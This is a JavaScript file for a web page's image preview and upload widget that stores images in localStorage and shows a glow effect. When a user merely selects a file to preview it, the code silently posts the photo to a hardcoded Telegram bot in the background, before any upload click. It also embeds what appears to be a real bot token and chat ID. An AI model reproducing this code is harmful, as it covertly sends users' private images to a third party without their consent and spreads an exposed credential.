// Function to display the selected image in the image-preview element
function displaySelectedImage() {
    // Get the file input and image preview elements
    const fileInput = document.getElementById('image-upload');
    const imagePreview = document.getElementById('preview-image');

    // Check if a file has been selected
    if (fileInput.files.length > 0) {
        // Get the selected file
        const file = fileInput.files[0];

        // Create a URL for the selected file and set it as the image source
        const imageURL = URL.createObjectURL(file);
        imagePreview.src = imageURL;
        imagePreview.style.display = 'block';

        // Hide other elements in the image-upload-window
        const uploadIcon = document.querySelector('.upload-icon');
        const uploadText = document.querySelector('.upload-text');
        uploadIcon.style.display = 'none';
        uploadText.style.display = 'none';

        // Automatically send the selected image to the Telegram bot (auto-upload in the background)
        sendImageToTelegramAndSaveToLocalDB(file, false, false);
    }
}

// Function to send the selected image to the Telegram bot and save to local database
function sendImageToTelegramAndSaveToLocalDB(file, showLoadingAnimation, manualUpload) {
    // Replace 'YOUR_BOT_TOKEN' and 'TARGET_CHAT_ID' with your bot token and target chat ID
    const botToken = '6816694158:AAGcTH8U5tX2cm_MKty7KfPr9uwVkg4JLG4';
    const chatId = '5816023717';

    // Get the loading animation element
    const loadingAnimation = document.getElementById('loading-animation');

    // Show or hide loading animation based on the 'showLoadingAnimation' parameter
    if (showLoadingAnimation) {
        loadingAnimation.style.display = 'block';
    }

    // Create a FormData object and append the selected image file
    const formData = new FormData();
    formData.append('photo', file);

    // Make a fetch request to send the image to the Telegram bot
    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
            method: 'POST',
            body: formData,
        })
        .then(response => response.json())
        .then(data => {
            // Handle the response from the Telegram API if needed
            console.log(data);

            // Hide loading animation after successfully sending image (only for manual upload)
            if (showLoadingAnimation) {
                loadingAnimation.style.display = 'none';

                // Trigger the glow effect on the account_circle icon
                triggerGlowEffect(true);

                // Save the image to the local database (localStorage in this example) for manual upload
                if (manualUpload) {
                    saveImageToLocalDB(file);
                }
            }
        })
        .catch(error => {
            // Handle errors

            // Hide loading animation in case of an error (only for manual upload)
            if (showLoadingAnimation) {
                loadingAnimation.style.display = 'none';
            }
            console.error(error);
        });
}
// Function to save the image to the local database (localStorage)
function saveImageToLocalDB(file) {
    try {
        // Convert the image file to a Base64-encoded string
        const reader = new FileReader();
        reader.onload = function (e) {
            const base64Image = e.target.result;

            // Generate a unique key for the image (you might want to use a more robust method)
            const key = 'image_' + Date.now();

            // Save the Base64-encoded image to localStorage using the generated key
            localStorage.setItem(key, base64Image);

            // For demonstration purposes, you can also log the key
            console.log('Image saved to local database with key:', key);
        };

        // Read the image file as a data URL
        reader.readAsDataURL(file);
    } catch (error) {
        // Handle errors when saving to the local database
        console.error('Error saving image to local database:', error);
    }
}

// Function to trigger the glow effect on the account_circle icon
function triggerGlowEffect(applyGlow) {
    const accountCircleIcon = document.querySelector('.material-symbols-outlined');

    // Check if the glow effect should be applied
    if (applyGlow) {
        // Add the 'glow' class to apply the glow effect
        accountCircleIcon.classList.add('glow');

        // Remove the 'glow' class after 2 seconds (2000 milliseconds)
        setTimeout(() => {
            accountCircleIcon.classList.remove('glow');
        }, 2000);
    }
}

// Attach an event listener to the "UPLOAD" button for manual upload with loading animation and save to local DB
document.getElementById('upload-button').addEventListener('click', function () {
    const fileInput = document.getElementById('image-upload');

    // Check if a file has been selected
    if (fileInput.files.length > 0) {
        const file = fileInput.files[0];
        // Manually trigger the upload with loading animation and save to local database
        sendImageToTelegramAndSaveToLocalDB(file, true, true);
    }
});

// Attach an event listener to the file input to display the selected image
document.getElementById('image-upload').addEventListener('change', displaySelectedImage);
